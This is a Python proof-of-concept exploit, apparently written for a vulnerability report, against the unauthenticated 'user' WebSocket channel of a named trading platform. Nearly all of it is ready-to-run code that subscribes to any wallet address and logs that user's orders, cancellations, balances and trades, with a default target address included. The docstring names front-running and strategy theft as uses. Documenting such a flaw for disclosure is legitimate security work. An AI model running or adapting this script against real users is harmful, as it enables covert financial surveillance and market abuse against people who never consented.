"""
PoC #1: WebSocket IDOR — Subscribe to ANY user's real-time trading activity

VULNERABILITY: The `user` channel on wss://ws.kuru.io accepts any wallet address
without authentication. An attacker sees every order, cancel, fill, and balance
update for ANY user on the platform.

IMPACT: Complete trading surveillance. Enables front-running, strategy theft,
and competitive intelligence gathering.

USAGE:
    python 01_ws_idor_surveillance.py <target_address>
    
    Example:
    python 01_ws_idor_surveillance.py 0x2b46C08Ca648e2334A1182D31228A79e2BEC1669
"""

import asyncio
import json
import sys
import time
import websockets


async def spy_on_user(target_address: str, duration: int = 30):
    uri = "wss://ws.kuru.io"

    async with websockets.connect(uri, ping_interval=20, close_timeout=10) as ws:
        # Subscribe to target's user feed — NO AUTH REQUIRED
        await ws.send(json.dumps({
            "type": "subscribe",
            "channel": "user",
            "address": target_address,
        }))

        resp = await asyncio.wait_for(ws.recv(), timeout=5)
        sub_data = json.loads(resp)

        if sub_data.get("type") != "subscribed":
            print(f"[!] Subscription failed: {sub_data}")
            return

        print(f"[+] Successfully subscribed to {target_address}")
        print(f"[+] Collecting events for {duration} seconds...")
        print("-" * 60)

        orders_created = 0
        orders_canceled = 0
        balance_updates = 0
        trades = 0
        start = time.time()

        while time.time() - start < duration:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=2)
                data = json.loads(msg)

                inner = data.get("data", {})
                if isinstance(inner, str):
                    inner = json.loads(inner)

                event_type = inner.get("type", "")
                event_data = inner.get("data", "")
                if isinstance(event_data, str):
                    try:
                        event_data = json.loads(event_data)
                    except:
                        continue

                if not isinstance(event_data, dict):
                    continue

                if event_type == "OrderCreated":
                    orders_created += 1
                    market = event_data.get("marketAddress", "")[:10]
                    price = event_data.get("price")
                    size = event_data.get("size")
                    is_buy = event_data.get("isBuy")
                    side = "BUY" if is_buy else "SELL"
                    print(f"  [{time.time()-start:5.1f}s] ORDER {side:4} | market={market}... | price={price} size={size}")

                elif event_type == "OrderCanceled":
                    orders_canceled += 1
                    ids = event_data.get("orderIds", [])
                    print(f"  [{time.time()-start:5.1f}s] CANCEL | orderIds={ids}")

                elif event_type == "BalanceUpdate":
                    balance_updates += 1
                    token = event_data.get("token", "")[:10]
                    balance = event_data.get("balance", "0")
                    print(f"  [{time.time()-start:5.1f}s] BALANCE | token={token}... | balance={balance}")

                elif event_type == "Trade":
                    trades += 1
                    print(f"  [{time.time()-start:5.1f}s] TRADE | {json.dumps(event_data)[:200]}")

            except asyncio.TimeoutError:
                continue

        print("-" * 60)
        print(f"\n[RESULTS] {duration}s surveillance on {target_address[:16]}...")
        print(f"  Orders placed:   {orders_created}")
        print(f"  Orders canceled: {orders_canceled}")
        print(f"  Balance updates: {balance_updates}")
        print(f"  Trades:          {trades}")
        print(f"\n[!] All of this was collected WITHOUT authentication.")
        print(f"[!] The attacker now knows this user's exact trading strategy.")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "0x2b46C08Ca648e2334A1182D31228A79e2BEC1669"
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    asyncio.run(spy_on_user(target, duration))
